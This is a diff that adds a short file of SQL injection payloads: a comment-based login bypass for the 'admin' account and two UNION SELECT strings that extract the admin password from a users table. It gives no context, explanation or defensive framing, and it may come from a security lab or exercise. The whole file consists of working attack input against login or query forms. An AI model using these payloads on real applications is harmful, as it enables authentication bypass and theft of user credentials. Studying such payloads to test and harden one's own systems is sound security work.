@@ -1,0 +1,4 @@
+admin' -- abc
+
+' union select null, password, null, null from users where username="admin" -- abc
+' UNION SELECT 2, password, 4, 1 from users where username = 'admin' -- abc
